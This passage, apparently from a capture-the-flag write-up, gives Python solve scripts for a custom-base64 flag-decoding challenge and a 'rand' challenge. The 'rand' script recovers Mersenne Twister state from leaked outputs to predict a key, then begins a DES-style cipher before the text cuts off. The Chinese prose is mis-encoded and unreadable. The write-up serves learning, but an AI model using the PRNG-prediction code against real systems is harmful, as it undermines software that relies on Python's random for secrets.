class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8-*-</span><br><span class="line">from base64 import *</span><br><span class="line">from string import *</span><br><span class="line"></span><br><span class="line">def check(s):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i not <span class="keyword">in</span> <span class="string">"flag&#123;-1234567890abcdef&#125;"</span>:</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">    <span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line">flag = 'uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz'</span><br><span class="line">a='pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF='</span><br><span class="line">b='YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM='</span><br><span class="line"><span class="keyword">alpha</span> = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789abcdefABCDEF+/'</span><br><span class="line">FLAG=''</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"fail words"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">        index = a.<span class="built_in">index</span>(i)</span><br><span class="line">        FLAG+=b[index]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        FLAG+='!'</span><br><span class="line">        <span class="keyword">print</span> i,</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nFLAG cipher"</span>       </span><br><span class="line"><span class="keyword">print</span> FLAG</span><br><span class="line">#'ZmxhZ3sxZTNhMm!lN!0xYz!yLT!mNGYtOWIyZ!!hNGFmYW!kZj!xZTZ!'</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"alternative words"</span></span><br><span class="line">aw=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">alpha</span>:</span><br><span class="line">    <span class="keyword">if</span> i not <span class="keyword">in</span> b:</span><br><span class="line">        aw += <span class="built_in">i</span></span><br><span class="line"><span class="keyword">print</span> aw</span><br><span class="line"></span><br><span class="line">'@#$%^&amp;'</span><br><span class="line"><span class="keyword">table</span> = 'ACHJKPRVefnuvw156789efAC+/'</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for z"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">if</span> b64decode(<span class="string">"ZTZ"</span>+i)[-1] == '&#125;':</span><br><span class="line">        FLAG = FLAG.<span class="keyword">replace</span>(<span class="string">"ZTZ!"</span>,<span class="string">"ZTZ9"</span>)</span><br><span class="line">        <span class="keyword">table</span> = <span class="keyword">table</span>.<span class="keyword">replace</span>(i,<span class="string">""</span>)</span><br><span class="line">        #<span class="keyword">print</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for G"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">if</span> check(b64decode(<span class="string">"Zj"</span>+i+<span class="string">"x"</span>)) and check(b64decode(<span class="string">"Yz"</span>+i+<span class="string">"y"</span>)):</span><br><span class="line">        #<span class="keyword">print</span> b64decode(<span class="string">"Zj"</span>+i+<span class="string">"x"</span>)</span><br><span class="line">        FLAG = FLAG.<span class="keyword">replace</span>(<span class="string">"Zj!x"</span>,<span class="string">"Zj"</span>+i+<span class="string">"x"</span>).<span class="keyword">replace</span>(<span class="string">"Yz!y"</span>,<span class="string">"Yz"</span>+i+<span class="string">"y"</span>)</span><br><span class="line">        <span class="keyword">table</span> = <span class="keyword">table</span>.<span class="keyword">replace</span>(i,<span class="string">""</span>)</span><br><span class="line">        #<span class="keyword">print</span> <span class="built_in">i</span></span><br><span class="line">        #<span class="keyword">print</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for I and s"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> check(b64decode(<span class="string">"N"</span>+i+<span class="string">"0x"</span>)) and check(b64decode(<span class="string">"Z"</span>+i+j+<span class="string">"h"</span>)):</span><br><span class="line">            #<span class="keyword">print</span> b64decode(<span class="string">"N"</span>+i+<span class="string">"0x"</span>),b64decode(<span class="string">"Z"</span>+i+j+<span class="string">"h"</span>)</span><br><span class="line">            FLAG = FLAG.<span class="keyword">replace</span>(<span class="string">"N!0x"</span>,<span class="string">"N"</span>+i+<span class="string">"0x"</span>).<span class="keyword">replace</span>(<span class="string">"Z!!h"</span>,<span class="string">"Z"</span>+i+j+<span class="string">"h"</span>)</span><br><span class="line">            <span class="keyword">table</span> = <span class="keyword">table</span>.<span class="keyword">replace</span>(i,<span class="string">""</span>).<span class="keyword">replace</span>(j,<span class="string">""</span>)</span><br><span class="line">            #<span class="keyword">print</span> i,<span class="built_in">j</span></span><br><span class="line">            #<span class="keyword">print</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for X and E"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">        <span class="keyword">if</span> j == i:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        s = b64decode(FLAG.<span class="keyword">replace</span>(<span class="string">"Mm!l"</span>,<span class="string">"Mm"</span>+i+<span class="string">"l"</span>).<span class="keyword">replace</span>(<span class="string">"LT!m"</span>,<span class="string">"LT"</span>+i+<span class="string">"m"</span>).<span class="keyword">replace</span>(<span class="string">"YW!k"</span>,<span class="string">"YW"</span>+j+'k'))</span><br><span class="line">        <span class="keyword">if</span> check(s):</span><br><span class="line">            <span class="keyword">print</span> <span class="built_in">s</span></span><br></pre></td></tr></table></figure><h2 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h2><p>å•Šï¼Œä¸€é“æ†¨æ†¨é¢˜ï¼Œmt19937éƒ½å¿«ç»™ç©çƒ‚äº†ã€‚è€Œä¸”è¿™è¿˜æ˜¯æœ€æœ€ç®€å•çš„é¢„æµ‹ï¼Œç›´æ¥å¥—ä¸Šç°æˆçš„å·¥å…·å°±èƒ½è§£keyã€‚è‡³äºåé¢çš„ä¸€ä¸ªåªç»™äº†åŠ å¯†å‡½æ•°æ²¡ç»™è§£å¯†å‡½æ•°ç”¨çš„feistelçš„å¯†ç ï¼Œå¯èƒ½æ˜¯DESå§ï¼Œæ²¡ç»†çœ‹ã€‚ç›´æ¥æŠŠå¯†é’¥æµåè¿‡æ¥ï¼Œç”¨ä»–ç»™çš„åŠ å¯†å‡½æ•°æ¥è§£å¯†å°±å¥½äº†ã€‚</p><p>MT19937é¢„æµ‹key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937Recover</span>:</span></span><br><span class="line">    <span class="string">"""Reverses the Mersenne Twister based on 624 observed outputs.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The internal state of a Mersenne Twister can be recovered by observing</span></span><br><span class="line"><span class="string">    624 generated outputs of it. However, if those are not directly</span></span><br><span class="line"><span class="string">    observed following a twist, another output is required to restore the</span></span><br><span class="line"><span class="string">    internal index.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    See also https://en.wikipedia.org/wiki/Mersenne_Twister#Pseudocode .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftRight</span><span class="params">(self, x, shift)</span>:</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            res = x ^ res &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftLeft</span><span class="params">(self, x, shift, mask)</span>:</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">untemper</span><span class="params">(self, v)</span>:</span></span><br><span class="line">        <span class="string">""" Reverses the tempering which is applied to outputs of MT19937 """</span></span><br><span class="line"></span><br><span class="line">        v = self.unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        v = self.unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(self, outputs, forward=True)</span>:</span></span><br><span class="line">        <span class="string">"""Reverses the Mersenne Twister based on 624 observed values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            outputs (List[int]): list of &gt;= 624 observed outputs from the PRNG.</span></span><br><span class="line"><span class="string">                However, &gt;= 625 outputs are required to correctly recover</span></span><br><span class="line"><span class="string">                the internal index.</span></span><br><span class="line"><span class="string">            forward (bool): Forward internal state until all observed outputs</span></span><br><span class="line"><span class="string">                are generated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Returns a random.Random() object.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        result_state = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> len(outputs) &gt;= <span class="number">624</span>       <span class="comment"># need at least 624 values</span></span><br><span class="line"></span><br><span class="line">        ivals = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            ivals.append(self.untemper(outputs[i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(outputs) &gt;= <span class="number">625</span>:</span><br><span class="line">            <span class="comment"># We have additional outputs and can correctly</span></span><br><span class="line">            <span class="comment"># recover the internal index by bruteforce</span></span><br><span class="line">            challenge = outputs[<span class="number">624</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">626</span>):</span><br><span class="line">                state = (<span class="number">3</span>, tuple(ivals+[i]), <span class="literal">None</span>)</span><br><span class="line">                r = random.Random()</span><br><span class="line">                r.setstate(state)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> challenge == r.getrandbits(<span class="number">32</span>):</span><br><span class="line">                    result_state = state</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># With only 624 outputs we assume they were the first observed 624</span></span><br><span class="line">            <span class="comment"># outputs after a twist --&gt;  we set the internal index to 624.</span></span><br><span class="line">            result_state = (<span class="number">3</span>, tuple(ivals+[<span class="number">624</span>]), <span class="literal">None</span>)</span><br><span class="line">        rand = random.Random()</span><br><span class="line">        rand.setstate(result_state)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(outputs)):</span><br><span class="line">                <span class="keyword">assert</span> rand.getrandbits(<span class="number">32</span>) == outputs[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rand</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_PythonMT19937Recover</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Just a testcase to ensure correctness"""</span></span><br><span class="line">    mtb = MT19937Recover()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#r1 = random.Random(0x31337)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># just some discarded random numbers to move internal state forward</span></span><br><span class="line">    <span class="comment">#[r1.getrandbits(32) for _ in range(1234)]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the actual leak of 1000 values</span></span><br><span class="line">    <span class="comment">#n = [r1.getrandbits(32) for _ in range(1000)]</span></span><br><span class="line">    <span class="keyword">with</span> open (<span class="string">"random"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        nn= f.read().split(<span class="string">"\n"</span>)</span><br><span class="line">        print(nn)</span><br><span class="line">        n = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> nn[:<span class="number">-1</span>]]</span><br><span class="line">    r2 = mtb.go(n)</span><br><span class="line">    <span class="keyword">print</span> (r2.getrandbits(<span class="number">32</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#assert r1.getrandbits(32) == r2.getrandbits(32)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_PythonMT19937Recover()</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°keyï¼Œæ”¹åŠ å¯†å‡½æ•°ï¼Œè§£å¯†å¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"flag&#123;************************************&#125;"</span></span><br><span class="line"></span><br><span class="line">hexadecimalcontrast = &#123;</span><br><span class="line">    <span class="string">'0'</span>: <span class="string">'0000'</span>,</span><br><span class="line">    <span class="string">'1'</span>: <span class="string">'0001'</span>,</span><br><span class="line">    <span class="string">'2'</span>: <span class="string">'0010'</span>,</span><br><span class="line">    <span class="string">'3'</span>: <span class="string">'0011'</span>,</span><br><span class="line">    <span class="string">'4'</span>: <span class="string">'0100'</span>,</span><br><span class="line">    <span class="string">'5'</span>: <span class="string">'0101'</span>,</span><br><span class="line">    <span class="string">'6'</span>: <span class="string">'0110'</span>,</span><br><span class="line">    <span class="string">'7'</span>: <span class="string">'0111'</span>,</span><br><span class="line">    <span class="string">'8'</span>: <span class="string">'1000'</span>,</span><br><span class="line">    <span class="string">'9'</span>: <span class="string">'1001'</span>,</span><br><span class="line">    <span class="string">'a'</span>: <span class="string">'1010'</span>,</span><br><span class="line">    <span class="string">'b'</span>: <span class="string">'1011'</span>,</span><br><span class="line">    <span class="string">'c'</span>: <span class="string">'1100'</span>,</span><br><span class="line">    <span class="string">'d'</span>: <span class="string">'1101'</span>,</span><br><span class="line">    <span class="string">'e'</span>: <span class="string">'1110'</span>,</span><br><span class="line">    <span class="string">'f'</span>: <span class="string">'1111'</span>,</span><br><span class="line">&#125;</span><br><span class="line">IP = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">      <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">      <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">      <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">IP_1 = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">        <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">        <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">        <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">        <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line">E = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">     <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">     <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">     <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">     <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">     <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">     <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line">S = [[<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, 